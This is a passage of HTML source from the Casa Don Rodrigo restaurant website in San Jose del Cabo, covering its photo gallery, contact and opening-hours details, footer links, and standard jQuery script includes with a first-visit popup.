								  <a class="popup-modal" href="media/gallery/10.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width-sm-large grid-item pizza dinner" style="position: absolute; left: 57.2057%; top: 1476.03px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/11.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/11.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width2 grid-item dolci wine" style="position: absolute; left: 0%; top: 1668.01px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/12.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/12.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width3 grid-item pizza" style="position: absolute; left: 47.9923%; top: 1668.01px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/13.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/13.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width4 grid-item pizza wine" style="position: absolute; left: 47.9923%; top: 1904.04px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/14.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/14.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width-large2 dolci grid-item" style="position: absolute; left: 0%; top: 1945.68px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/6.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/6.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item grid-item dinner cocktails" style="position: absolute; left: 42.7668%; top: 2214.04px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/7.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/7.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width-sm grid-item cocktails dinner wine" style="position: absolute; left: 0%; top: 2317.15px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/8.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/8.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width-sm grid-item cocktails wine" style="position: absolute; left: 28.4653%; top: 2390.05px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/9.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/9.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width-large grid-item pizza dolci cocktails" style="position: absolute; left: 0%; top: 2591.31px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/1.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/1.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width-sm-large grid-item pizza dinner" style="position: absolute; left: 57.2057%; top: 2390.05px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/2.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/2.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width2 grid-item dolci wine" style="position: absolute; left: 0%; top: 2783.3px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/3.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/3.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width3 grid-item pizza" style="position: absolute; left: 47.9923%; top: 2783.3px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/4.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/4.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
			
							<div class="cafe-gallery-item width4 grid-item pizza wine" style="position: absolute; left: 47.9923%; top: 3019.33px;">
							  <div class="cafe-isotope-grid__img">
								<img src="media/gallery/5.jpg" alt="gallery thumb">
			
								<div class="gallery-info">
								  <a class="popup-modal" href="media/gallery/5.jpg"><i class="ei ei-icon_search"></i></a>
								</div>
							  </div>
							</div>
						  </div>
						</div>
					  </div>
					  <!-- /.gallery-inner -->
					</div>
					<!-- /.container -->
				  </section>
				<!-- /.gallery -->


				<div class="contact-info-wrapper">
					<div class="container">

						<div class="contact-infos">
							<div class="row">
								<div class="col-xl-3 col-lg-3 col-md-4 col-sm-6">
									<div class="contact-info wow fadeIn">
										<div class="icon"><i class="ei ei-icon_house_alt"></i></div>

										<h3 class="title">Address</h3>

										<div class="content">
											<p>
												Mijares #29, Calle Grande, <br> Centro San Jose del Cabo, <br>
												Mexico, 23400
											</p>
										</div>
										<!-- /.content -->
									</div>
									<!-- /.contact-info -->
								</div>
								<!-- /.col-xl-3 col-lg-3 col-md-4 col-sm-6 -->

								<div class="col-xl-3 col-lg-3 col-md-4 col-sm-6">

									<div class="contact-info wow fadeIn" data-wow-delay="0.3s">
										<div class="icon"><i class="ei ei-icon_phone"></i></div>

										<h3 class="title">Phone</h3>
										<div class="content">
											<p>
												<span>For Reservations</span><br> Call <a href="tel:624-142-0418">624-142-0418</a>
											</p>
										</div>
										<!-- /.content -->
									</div>
									<!-- /.contact-info -->
								</div>
								<!-- /.col-xl-3 col-lg-3 col-md-4 col-sm-6 -->

								<div class="col-xl-3 col-lg-3 col-md-4 col-sm-6">

									<div class="contact-info wow fadeIn" data-wow-delay="0.4s">
										<div class="icon"><i class="ei ei-icon_clock_alt"></i></div>

										<h3 class="title">Casa Don Rodrigo, Cantina29 and ChoyaRose</h3>

										<div class="content">
											<p>
												Monday to Saturday, lunch and dinner, from 11:30 am to 11:00 
												pm. <b>Closed Sunday.</b>
											</p>
										</div>
										<!-- /.content -->
									</div>
									<!-- /.contact-info -->
								</div>
								<!-- /.col-xl-3 col-lg-3 col-md-4 col-sm-6 -->

								<div class="col-xl-3 col-lg-3 col-md-4 col-sm-6">

									<div class="contact-info wow fadeIn" data-wow-delay="0.5s">
										<div class="icon"><i class="ei ei-icon_mail_alt"></i></div>

										<h3 class="title">Email</h3>

										<div class="content">
											<p>
												Casa Don Rodrigo <br> <a href="mailto:info@casadonrodrigo.com">info@casadonrodrigo.com</a><br>For
												Choya Rose<br> <a href="mailto:info@choyarose.com">info@choyarose.com</a>
											</p>
										</div>
										<!-- /.content -->
									</div>
									<!-- /.contact-info -->
								</div>
								<!-- /.col-xl-3 col-lg-3 col-md-4 col-sm-6 -->
							</div>
							<!-- /.row -->
						</div>
						<!-- /.row -->


					</div>
					<!-- /.container -->
				</div>

				<!--=========================-->
				<!--=        Footer         =-->
				<!--=========================-->
				<footer id="footer-two">
					<div class="footer-top">
						<div class="container">

							<div class="row">
								<div class="col-md-6">
									<ul class="footer-menu">
										<li><a href="/">Home</a></li>
										<li><a href="#nosotros">About</a></li>
										<li><a href="#galeria">Gallery</a></li>
										<li><a target="_blank"
												href="https://www.opentable.com.mx/restref/client/?restref=1034446&lang=en-US&corrid=df0c702e-6a9b-47b0-944e-a36f9e87cf1a">Reservations</a></li>
									</ul>
								</div>
							</div>
							<!-- /.row -->
						</div>
						<!-- /.container -->
					</div>
					<!-- /.footer-top -->

					<div class="site-info-two" data-bg-image="media/background/foo-bg.jpg">
						<div class="container">
							<div class="row no-gutters align-items-center">
								<div class="col-md-5">
									<p class="copy-right">© 2020 Casa Don Rodrigo, all Rights Reserved.<br>Design
										by <a target="_blank" href="http://bananagroup.mx">Banana Group</a></p>
								</div>
								<!-- /.col-md-5 -->

								<div class="col-md-2">
									<a href="/" class="footer-logo">
										<img src="assets/img/sticky-logo.png" alt="logo">
									</a>

								</div>
								<!-- /.col-md-2 -->

								<div class="col-md-5">
									<div class="follow-us d-flex justify-content-end">
										<span>Follow Us:</span>
										<ul class="footer-social-link">
											<li><a target="_blank"
													href="https://www.facebook.com/CasaDonRodrigo/"><i class="fab
														fa-facebook-f"></i></a></li>
											<li><a target="_blank"
													href="https://www.instagram.com/casa.donrodrigo/"><i class="fab
														fa-instagram"></i></a></li>
											<li><a target="_blank"
													href="https://www.tripadvisor.com.mx/Restaurant_Review-g152516-d7047548-Reviews-Casa_Don_Rodrigo-San_Jose_del_Cabo_Los_Cabos_Baja_California.html"><i
														class="fab fa-tripadvisor"></i></a></li>
											<li><a target="_blank"
													href="https://www.yelp.com.mx/biz/casa-don-rodrigo-san-jos%C3%A9-del-cabo"><i
														class="fab fa-yelp"></i></a></li>
										</ul>
									</div>
									<!-- /.follow-us -->

								</div>
								<!-- /.col-md-6 -->
							</div>
							<!-- /.row -->
						</div>
						<!-- /.sontainer -->
					</div>
					<!-- /.site-info -->
				</footer>
				<!-- /#footer -->




				<style>
			#whatsapp {
				position: fixed;
				z-index: 999;
				width: 4rem;
				bottom: 110px;
				right: 10px;
			}
		</style>
				<a
					href="https://wa.me/+526241420418?text=Hola%20me%20gustaria%20saber%20más%20de%20sus%20productos."
					target="_blank">
					<img src="assets/img/whats.png" alt="WhatsApp" id="whatsapp" />
				</a>

			</div>
			<!-- /#site -->

			<!-- Dependency Scripts -->
			<script src="dependencies/popper.js/popper.min.js"></script>
			<script src="dependencies/jquery/jquery.min.js"></script>
			<script src="dependencies/bootstrap/js/bootstrap.min.js"></script>
			<script src="dependencies/swiper/js/swiper.jquery.min.js"></script>
			<script src="dependencies/swiperRunner/js/swiperRunner.min.js"></script>
			<script src="dependencies/jquery.appear/jquery.appear.js"></script>
			<script src="dependencies/air-datepicker/js/datepicker.min.js"></script>
			<script src="dependencies/air-datepicker/js/datepicker.en.js"></script>
			<script src="dependencies/gmap3/js/gmap3.min.js"></script>
			<script src="dependencies/magnific-popup/js/jquery.magnific-popup.min.js"></script>
			<script src="dependencies/imagesloaded/imagesloaded.pkgd.min.js"></script>
			<script src="dependencies/isotope-layout/isotope.pkgd.min.js"></script>
			<script src="dependencies/jquery.parallax-scroll/jquery.parallax-scroll.js"></script>
			<script src="dependencies/wow/js/wow.min.js"></script>
			<script src="assets/js/jarallax.min.js"></script>
			<script
				src="../external.html?link=https://maps.googleapis.com/maps/api/js?key=AIzaSyB13ZAvCezMx5TETYIiGlzVIq65Mc2FG5g"></script>
			<script
				src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js"></script>
			<script
				src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.0/jquery.cookie.js"></script>
			<script>jQuery(document).ready(function () {
            
		function openFancybox() {
			setTimeout(function () {
				jQuery('#popuplink').trigger('click');
			}, 500);
		};
		
		var visited = jQuery.cookie('visited');
		if (visited == 'yes') {
			// second page load, cookie active
		} else {
			openFancybox(); // first page load, launch fancybox
		}
		jQuery.cookie('visited', 'yes', {
			expires: 1 // the number of days cookie  will be effective
		});
		jQuery("#popuplink").fancybox({modal:true, maxWidth: 700, overlay : {closeClick : true}});
	});
</script>
			<!-- Site Scripts -->
			<!-- <script src="assets/js/smooth-scroll.js"></script> -->
			<script src="assets/js/app.js"></script>

		</body>



	</html>
